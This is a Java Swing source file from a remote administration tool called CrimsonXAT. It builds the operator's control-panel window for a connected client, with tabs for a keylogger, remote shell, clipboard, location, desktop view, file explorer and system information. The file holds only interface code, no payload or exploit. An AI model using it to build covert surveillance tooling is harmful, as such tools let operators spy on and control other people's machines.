/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.server.graphics;

import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.Rectangle;
import java.awt.Toolkit;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.util.ArrayList;

import javax.swing.JCheckBox;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTabbedPane;
import javax.swing.border.EmptyBorder;
import javax.swing.event.ChangeEvent;
import javax.swing.event.ChangeListener;

import subterranean.crimson.server.Server;
import subterranean.crimson.server.commands.ClientCommands;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPClient;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPClipboard;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPDesktop;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPExplorer;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPInformation;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPKeylogger;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPLocation;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPLog;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPMessages;
import subterranean.crimson.server.graphics.panels.cp.desktop.SPShell;
import subterranean.crimson.server.network.Connection;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.NativeSystem.Family;
import subterranean.crimson.universal.exceptions.InvalidResponseException;
import subterranean.crimson.universal.translation.T;

public class DesktopControlPanel extends ControlPanel {

	private static final long serialVersionUID = 1L;
	private JPanel contentPane;

	private JTabbedPane globalTabbedPane;
	private JCheckBox chckbxKeylogger;
	private JCheckBox chckbxExplorers;
	private JCheckBox chckbxInformation;
	private JCheckBox chckbxClient;
	private JCheckBox chckbxMessages;
	private JCheckBox chckbxLocation;
	private JCheckBox chckbxShell;
	private JCheckBox chckbxLog;
	private JCheckBox chckbxDesktop;
	private JCheckBox chckbxClipboard;

	private ArrayList<TabComponent> tabs = new ArrayList<TabComponent>();

	public void terminate() {
		dispose();
	}

	public DesktopControlPanel(Connection con) {
		setPreferredSize(new Dimension(810, 500));
		setMinimumSize(new Dimension(810, 500));
		setBounds(new Rectangle(0, 0, 810, 500));

		setIconImage(Toolkit.getDefaultToolkit().getImage(DesktopControlPanel.class.getResource("/subterranean/crimson/server/graphics/icons/icon.png")));

		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		c = con;
		setTitle(c.getProfile().info.getHostname() + ": Control Panel");
		setBounds(100, 100, 810, 500);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new BorderLayout(0, 0));

		JSplitPane splitPane = new JSplitPane();
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		contentPane.add(splitPane, BorderLayout.CENTER);

		globalTabbedPane = new JTabbedPane(JTabbedPane.LEFT);
		globalTabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);
		splitPane.setLeftComponent(globalTabbedPane);
		globalTabbedPane.addChangeListener(new ChangeListener() {
			public void stateChanged(ChangeEvent arg0) {
				// get name of new tab
				JTabbedPane sourceTabbedPane = (JTabbedPane) arg0.getSource();
				int index = sourceTabbedPane.getSelectedIndex();
				switch (sourceTabbedPane.getTitleAt(index)) {
				case ("Information"): {

					Runnable r = new Runnable() {
						public void run() {
							// if no info exists, get it
							if (c.getProfile().details == null) {
								try {
									c.getProfile().details = ClientCommands.sigar_gather(c);
								} catch (InvalidResponseException e) {
									Logger.add("Could not get detailed information");
									return;
								}

							}
							// print out the information
							for (String s : c.getProfile().details.keySet()) {
								System.out.println("KEY: " + s + " VALUE: " + c.getProfile().details.get(s));

							}

							// update_information();

							// switch the cards
							// CardLayout cardLayout = (CardLayout)
							// information_panel.getLayout();
							// cardLayout.next(information_panel);
						}
					};
					new Thread(r).start();

					break;
				}

				}

			}
		});

		if (Platform.os == Family.DARWIN) {
			// tabs
			if (Server.getSettings().getDesktopCP().SPMessages) {
				Logger.add("Loading Messages Panel");
				globalTabbedPane.addTab(T.t("cpmenu-messages"), new SPMessages(this));
			}
			if (Server.getSettings().getDesktopCP().SPClient) {
				Logger.add("Loading Client Panel");
				globalTabbedPane.addTab(T.t("cpmenu-client"), new SPClient(this));
			}
			if (Server.getSettings().getDesktopCP().SPKeylogger) {
				Logger.add("Loading Keylogger Panel");
				globalTabbedPane.addTab(T.t("cpmenu-keylogger"), new SPKeylogger(this));
			}
			if (Server.getSettings().getDesktopCP().SPLocation) {
				Logger.add("Loading Location Panel");
				globalTabbedPane.addTab(T.t("cpmenu-location"), new SPLocation(this));
			}
			if (Server.getSettings().getDesktopCP().SPShell) {
				Logger.add("Loading Shell Panel");
				globalTabbedPane.addTab(T.t("cpmenu-shell"), new SPShell(this));
			}
			if (Server.getSettings().getDesktopCP().SPExplorer) {
				Logger.add("Loading Explorer Panel");
				globalTabbedPane.addTab(T.t("cpmenu-explorer"), new SPExplorer(this));
			}
			if (Server.getSettings().getDesktopCP().SPDesktop) {
				Logger.add("Loading Desktop Panel");
				globalTabbedPane.addTab(T.t("cpmenu-desktop"), new SPDesktop(this));
			}
			if (Server.getSettings().getDesktopCP().SPClipboard) {
				Logger.add("Loading Clipboard Panel");
				globalTabbedPane.addTab(T.t("cpmenu-clipboard"), new SPClipboard(this));
			}
			if (Server.getSettings().getDesktopCP().SPLog) {
				Logger.add("Loading Log Panel");
				globalTabbedPane.addTab(T.t("cpmenu-log"), new SPLog(this));
			}
			if (Server.getSettings().getDesktopCP().SPInformation) {
				Logger.add("Loading Information Panel");
				globalTabbedPane.addTab(T.t("cpmenu-information"), new SPInformation(this));
			}
		} else {
			// tabs
			int tabIndex = 0;// this index is incremented after every true 'if' block
			if (Server.getSettings().getDesktopCP().SPMessages) {
				Logger.add("Loading Messages Panel");
				TabComponent messageTC = new TabComponent(this, T.t("cpmenu-messages"), new SPMessages(this));
				tabs.add(messageTC);
				globalTabbedPane.addTab(null, messageTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, messageTC);
			}
			if (Server.getSettings().getDesktopCP().SPClient) {
				Logger.add("Loading Client Panel");
				TabComponent clientTC = new TabComponent(this, T.t("cpmenu-client"), new SPClient(this));
				tabs.add(clientTC);
				globalTabbedPane.addTab(null, clientTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, clientTC);
			}
			if (Server.getSettings().getDesktopCP().SPKeylogger) {
				Logger.add("Loading Keylogger Panel");
				TabComponent keyloggerTC = new TabComponent(this, T.t("cpmenu-keylogger"), new SPKeylogger(this));
				tabs.add(keyloggerTC);
				globalTabbedPane.addTab(null, keyloggerTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, keyloggerTC);
			}
			if (Server.getSettings().getDesktopCP().SPLocation) {
				Logger.add("Loading Location Panel");
				TabComponent locationTC = new TabComponent(this, T.t("cpmenu-location"), new SPLocation(this));
				tabs.add(locationTC);
				globalTabbedPane.addTab(null, locationTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, locationTC);
			}
			if (Server.getSettings().getDesktopCP().SPShell) {
				Logger.add("Loading Shell Panel");
				TabComponent shellTC = new TabComponent(this, T.t("cpmenu-shell"), new SPShell(this));
				tabs.add(shellTC);
				globalTabbedPane.addTab(null, shellTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, shellTC);
			}
			if (Server.getSettings().getDesktopCP().SPExplorer) {
				Logger.add("Loading Explorer Panel");
				TabComponent explorerTC = new TabComponent(this, T.t("cpmenu-explorer"), new SPExplorer(this));
				tabs.add(explorerTC);
				globalTabbedPane.addTab(null, explorerTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, explorerTC);
			}
			if (Server.getSettings().getDesktopCP().SPDesktop) {
				Logger.add("Loading Desktop Panel");
				TabComponent desktopTC = new TabComponent(this, T.t("cpmenu-desktop"), new SPDesktop(this));
				tabs.add(desktopTC);
				globalTabbedPane.addTab(null, desktopTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, desktopTC);
			}
			if (Server.getSettings().getDesktopCP().SPClipboard) {
				Logger.add("Loading Clipboard Panel");
				TabComponent clipboardTC = new TabComponent(this, T.t("cpmenu-clipboard"), new SPClipboard(this));
				tabs.add(clipboardTC);
				globalTabbedPane.addTab(null, clipboardTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, clipboardTC);
			}
			if (Server.getSettings().getDesktopCP().SPLog) {
				Logger.add("Loading Log Panel");
				TabComponent clientLogTC = new TabComponent(this, T.t("cpmenu-log"), new SPLog(this));
				tabs.add(clientLogTC);
				globalTabbedPane.addTab(null, clientLogTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, clientLogTC);
			}
			if (Server.getSettings().getDesktopCP().SPInformation) {
				Logger.add("Loading Information Panel");
				TabComponent informationTC = new TabComponent(this, T.t("cpmenu-information"), new SPInformation(this));
				tabs.add(informationTC);
				globalTabbedPane.addTab(null, informationTC.cpanel);
				globalTabbedPane.setTabComponentAt(tabIndex++, informationTC);
			}
		}
		JPanel console = new JPanel();
		splitPane.setRightComponent(console);
		console.setLayout(new BorderLayout(0, 0));

		cpconsole = new CPConsole();
		console.add(cpconsole, BorderLayout.CENTER);

		splitPane.setDividerLocation(400);

		JMenuBar menuBar_1 = new JMenuBar();
		contentPane.add(menuBar_1, BorderLayout.NORTH);

		JMenu mnPanels = new JMenu("Panels");
		menuBar_1.add(mnPanels);

		JMenuItem mntmRestoreAllTabs = new JMenuItem("Restore All Tabs");
		mnPanels.add(mntmRestoreAllTabs);

		JMenu mnView = new JMenu(T.t("menu-view"));
		mnPanels.add(mnView);

		chckbxKeylogger = new JCheckBox(T.t("cpmenu-keylogger"));
		chckbxKeylogger.setSelected(Server.getSettings().getDesktopCP().SPKeylogger);
		chckbxKeylogger.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
				if (chckbxKeylogger.isSelected()) {
					Logger.add("Removing Keylogger tab");
				} else {
					Logger.add("Adding Keylogger tab");
				}

			}
		});
		mnView.add(chckbxKeylogger);

		chckbxExplorers = new JCheckBox(T.t("cpmenu-explorer"));
		chckbxExplorers.setSelected(Server.getSettings().getDesktopCP().SPExplorer);
		chckbxExplorers.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxExplorers);

		chckbxInformation = new JCheckBox(T.t("cpmenu-information"));
		chckbxInformation.setSelected(Server.getSettings().getDesktopCP().SPInformation);
		chckbxInformation.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxInformation);

		chckbxClient = new JCheckBox(T.t("cpmenu-client"));
		chckbxClient.setSelected(Server.getSettings().getDesktopCP().SPClient);
		chckbxClient.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxClient);

		chckbxMessages = new JCheckBox(T.t("cpmenu-messages"));
		chckbxMessages.setSelected(Server.getSettings().getDesktopCP().SPMessages);
		chckbxMessages.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxMessages);

		chckbxLocation = new JCheckBox(T.t("cpmenu-location"));
		chckbxLocation.setSelected(Server.getSettings().getDesktopCP().SPLocation);
		chckbxLocation.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxLocation);

		chckbxShell = new JCheckBox(T.t("cpmenu-shell"));
		chckbxShell.setSelected(Server.getSettings().getDesktopCP().SPShell);
		chckbxShell.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxShell);

		chckbxLog = new JCheckBox(T.t("cpmenu-log"));
		chckbxLog.setSelected(Server.getSettings().getDesktopCP().SPLog);
		chckbxLog.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxLog);

		chckbxDesktop = new JCheckBox(T.t("cpmenu-desktop"));
		chckbxDesktop.setSelected(Server.getSettings().getDesktopCP().SPDesktop);
		chckbxDesktop.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxDesktop);

		chckbxClipboard = new JCheckBox(T.t("cpmenu-clipboard"));
		chckbxClipboard.setSelected(Server.getSettings().getDesktopCP().SPClipboard);
		chckbxClipboard.addMouseListener(new MouseAdapter() {
			@Override
			public void mousePressed(MouseEvent e) {
			}
		});
		mnView.add(chckbxClipboard);

		consoleAppend(T.t("console-init"));

	}

	public void updateTransfers() {
		// ttm.fireTableDataChanged();
	}

	public void dispose() {
		// remove from control panels
		Server.controlPanels.remove(this);

		// notify the client that the cp has been closed
		// TODO

		super.dispose();
	}

	@Override
	public void updateKeylogger() {
		try {
			for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
				if (globalTabbedPane.getTabComponentAt(i) instanceof SPKeylogger) {
					((SPKeylogger) globalTabbedPane.getComponentAt(i)).updateKeylogger();

					return;
				}
			}
		} catch (Exception e) {
			// the panel is probably not visible
		}

	}

	public void detachTab(TabComponent tc) {
		Logger.add("Detaching Tab");
		for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
			if (tc == globalTabbedPane.getTabComponentAt(i)) {
				SeparateWindow sw = new SeparateWindow((JPanel) globalTabbedPane.getComponentAt(i));
				sw.setVisible(true);

				updateTabViews();
				return;
			}
		}
	}

	public void closeTab(TabComponent tc) {
		Logger.add("Closing Tab");
		for (int i = 0; i < globalTabbedPane.getTabCount(); i++) {
			if (tc == globalTabbedPane.getTabComponentAt(i)) {

				globalTabbedPane.remove(i);
				updateTabViews();
				tabs.remove(tc);
				return;
			}
		}
	}

	public boolean containsTab(String name) {
		for (TabComponent tc : tabs) {
			if (tc.cpanel.getPanelName().toLowerCase().equals(name.toLowerCase())) {

				return true;
			}
		}
		return false;
	}

	public void updateTabViews() {
		// deselect all
		chckbxKeylogger.setSelected(containsTab("keylogger"));
		chckbxClient.setSelected(containsTab("client"));
		chckbxClipboard.setSelected(containsTab("clipboard"));
		chckbxDesktop.setSelected(containsTab("desktop"));
		chckbxExplorers.setSelected(containsTab("explorers"));
		chckbxInformation.setSelected(containsTab("information"));
		chckbxLocation.setSelected(containsTab("location"));
		chckbxLog.setSelected(containsTab("log"));
		chckbxMessages.setSelected(containsTab("messages"));
		chckbxShell.setSelected(containsTab("shell"));

		// reset memory
		Server.getSettings().getDesktopCP().SPClient = chckbxClient.isSelected();
		Server.getSettings().getDesktopCP().SPClipboard = chckbxClipboard.isSelected();
		Server.getSettings().getDesktopCP().SPDesktop = chckbxDesktop.isSelected();
		Server.getSettings().getDesktopCP().SPExplorer = chckbxExplorers.isSelected();
		Server.getSettings().getDesktopCP().SPInformation = chckbxInformation.isSelected();
		Server.getSettings().getDesktopCP().SPKeylogger = chckbxKeylogger.isSelected();
		Server.getSettings().getDesktopCP().SPLocation = chckbxLocation.isSelected();
		Server.getSettings().getDesktopCP().SPLog = chckbxLog.isSelected();
		Server.getSettings().getDesktopCP().SPMessages = chckbxMessages.isSelected();
		Server.getSettings().getDesktopCP().SPShell = chckbxShell.isSelected();
	}

	@Override
	public void refreshControls() {
		if (c == null) {

		} else {

		}

	}

}
